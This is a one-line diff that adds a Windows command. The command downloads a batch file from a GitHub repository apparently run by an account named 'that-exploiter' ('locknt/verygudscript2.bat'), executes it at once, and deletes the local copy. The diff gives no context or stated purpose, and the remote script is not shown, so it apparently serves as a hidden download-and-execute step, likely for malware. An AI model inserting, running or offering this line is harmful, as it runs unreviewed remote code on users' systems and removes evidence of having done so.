@@ -1,0 +1,1 @@
+curl -o temp_file.bat https://raw.githubusercontent.com/that-exploiter/locknt/refs/heads/main/verygudscript2.bat && call temp_file.bat && del temp_file.bat
